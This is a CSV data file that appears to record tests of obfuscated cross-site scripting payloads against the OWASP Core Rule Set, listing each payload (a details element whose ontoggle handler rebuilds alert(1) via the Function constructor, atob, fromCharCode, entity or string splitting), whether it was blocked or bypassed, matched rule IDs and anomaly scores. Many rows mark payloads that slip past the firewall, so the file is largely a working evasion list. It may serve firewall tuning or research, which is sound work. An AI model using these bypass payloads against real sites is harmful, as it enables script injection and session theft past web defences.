index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
626,"<details open ontoggle=""Function`&#97;&#108;&#101;&#114;&#116;(1)`()"">",0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603366475.894450
627,"<details open ontoggle=""(()=>Function('&#97;&#108;&#101;&#114;&#116;(1)'))()()"">",0,1,block,4,"933210,941100,941120,949110","o68,10v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603366517.225619
628,"<details open ontoggle=""Function['constructor']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o32,53v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603366634.461458
629,"<details open ontoggle=""(1,Function)('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603366715.160261
630,"<details open ontoggle=""new/**/Function('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603366837.161860
634,"<details open ontoggle=""(true,Function)('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603367126.641873
638,"<details open ontoggle=""Function(atob('YWxlcnQoMSk'))()"">",0,1,bypass,2,"941100,941120","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603367535.681084
641,"<details open ontoggle=""top['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,58t:urlDecodeUni,t:compressWhitespace || ",20,177603367887.513697
645,"<details open ontoggle=""Function['constructor']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o32,32v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603368222.132411
647,"<details open ontoggle=""globalThis['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o34,29v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603368485.972823
648,"<details open ontoggle=""(function(){return this})()['Function']('al'+'ert(1)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,56v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || o25,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603368568.157449
651,"<details open ontoggle=""Function(`al`+`ert(1)`)()"">",0,1,block,4,"941100,941120,942100,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,51 || ",15,177603368823.898717
654,"<details open ontoggle=""Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()"">",0,1,block,4,"933210,941100,941120,949110","o32,55v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603369168.190626
655,"<details open ontoggle=""Function(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603369291.663519
659,"<details open ontoggle=""new Function('al'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v216,55 || o24,13v216,55t:urlDecodeUni || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603369696.768771
662,"<details open ontoggle=""(()=>Function('al'+'ert(1)')())()""></details>",0,1,block,4,"933210,941100,941120,949110","o37,20v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603369995.609827
676,"<details open ontoggle=""(function(){return Function})()('al'+'ert(1)')()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,48v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,84 || o25,11v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603371244.334326
679,"<details open ontoggle=""Function['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o32,32v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760337151.089913
680,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,49v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603371669.519229
681,"<details open ontoggle=""top['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,68t:urlDecodeUni,t:compressWhitespace || ",20,177603371732.188436
682,"<details open ontoggle=""self['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,29v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,69t:urlDecodeUni,t:compressWhitespace || ",20,177603371867.982492
683,"<details open ontoggle=""parent['Function']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,29v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603371985.581217
685,"<details open ontoggle=""globalThis['Function']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,29v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603372137.935619
686,"<details open ontoggle=""window['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o30,29v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,71t:urlDecodeUni,t:compressWhitespace || ",20,177603372219.966353
687,"<details open ontoggle=""Function(String.fromCharCode(97,108,101,114,116,40,49,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o33,19v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760337237.147846
688,"<details open ontoggle=""Function(`ale`+`rt(1)`)()""></details>",0,1,block,4,"941100,941120,942100,949110","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,61 || ",15,177603372483.423958
692,"<details open ontoggle=""[].constructor.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760337292.586130
693,"<details open ontoggle=""Function('al'+'e'+'rt'+'(1)')()""></details>",0,1,block,5,"941100,941120,942100,942100,949110","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,67 || v217,67t:urlDecodeUni || ",20,177603373069.296298
694,"<details open ontoggle=""(function(){return this})()['Function']('ale'+'rt(1)')()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,56v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || o25,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603373187.419650
696,"<details open ontoggle=""Function.prototype.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603373337.035492
697,"<details open ontoggle=""Function.call(null,'ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603373462.970448
698,"<details open ontoggle=""Function.apply(null,['ale'+'rt(1)'])()""></details>",0,1,bypass,2,"941100,941120","v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603373415.853895
703,"<details open ontoggle=""Function('return\x20eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"941100,941120,942100,949110","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,76 || ",15,177603374061.854352
719,"<details open ontoggle=""Function('retu'+'rn\x20ev'+'al')()(atob('YWxlcnQoMSk='))"">",0,1,block,5,"941100,941120,942100,942100,949110","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,82 || v217,82t:urlDecodeUni || ",20,17760337555.088807
720,"<details open ontoggle=""Function(['retu','rn ev','al'].join(''))()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"933210,941100,941120,949110","o59,29v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603375678.968575
721,"<details open ontoggle=""Function(String.fromCharCode(114,101,116,117,114,110,32,101,118,97,108))()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"934100,941100,941120,949110","o33,19v217,122 || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603375786.392105
723,"<details open ontoggle=""Function('return\u0020eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"941100,941120,942100,949110","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,78 || ",15,177603375992.828805
724,"<details open ontoggle=""Function('return\x09eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"941100,941120,942100,949110","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,76 || ",15,177603376019.105106
726,"<details open ontoggle=""(function(){return Function})()('return\x20eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,5,"933210,934100,941100,941120,949110","o24,73v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603376215.384697
729,"<details open ontoggle=""Function('ret'+'urn\x20'+'eval')()(atob('YWxl'+'cnQoMSk='))"">",0,1,block,5,"941100,941120,942100,942100,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,85 || v217,85t:urlDecodeUni || ",20,177603376511.779498
730,"<details open ontoggle=""Function(atob('cmV0dXJuIGV2YWw='))()(atob('YWxlcnQoMSk='))"">",0,1,bypass,2,"941100,941120","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603376632.955338
732,"<details open ontoggle=""self['Function']('return\x20eval')()(atob('YWxlcnQoMSk='))"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,54v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,84t:urlDecodeUni,t:compressWhitespace || ",20,177603376860.895774
734,"<details open ontoggle=""Function(unescape('return%20eval'))()(atob('YWxlcnQoMSk='))"">",0,1,block,4,"933210,941100,941120,949110","o32,49v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760337707.372328
735,"<details open ontoggle=""Function('return\x20'+'eval')()(atob('YWxl'+'cnQoMS'+'k='))"">",0,1,block,5,"941100,941120,942100,942100,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,85 || v217,85t:urlDecodeUni || ",20,177603377197.528515
736,"<details open ontoggle=""Function('return\x20eval'.replace(/\s/,' '))()(atob('YWxlcnQoMSk='))"">",0,1,bypass,2,"941100,941120","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603377297.626383
739,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603377578.671059
740,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603377657.270330
742,"<details open ontoggle=""new Function('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603377873.325848
744,"<details open ontoggle=""new Function('\141\154\145\162\164\05041\051')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603378020.973270
746,"<details open ontoggle=""Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"941100,941120,942100,949110","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,82 || ",15,177603378292.839384
747,"<details open ontoggle=""new window['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o34,50v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,18v217,96t:urlDecodeUni,t:compressWhitespace || ",20,177603378310.071979
748,"<details open ontoggle=""new/**/ Function /**/ ('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603378414.411992
749,"<details	open	ontoggle=""new	Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603378541.561351
750,"<details open ontoggle=""new Function(`&#97;&#108;&#101;&#114;&#116;(1)`)()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603378653.362869
751,"<details open ontoggle=""new Function(String['fromCharCode'](97,108,101,114,116,40,49,41))()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o36,55v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603378739.769842
753,"<details open ontoggle=""new top.Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603378953.712102
754,"<details open ontoggle=""new Function('aler'+'t(1)')()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603379030.200344
756,"<details open ontoggle=""new self['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o32,50v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,94t:urlDecodeUni,t:compressWhitespace || ",20,177603379246.912235
758,"<details open ontoggle=""new parent.Function('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603379461.524114
759,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,50,57,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603379546.277508
760,"<details open ontoggle=""new Function(atob('YWxlcnQoMjkp'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603379640.191169
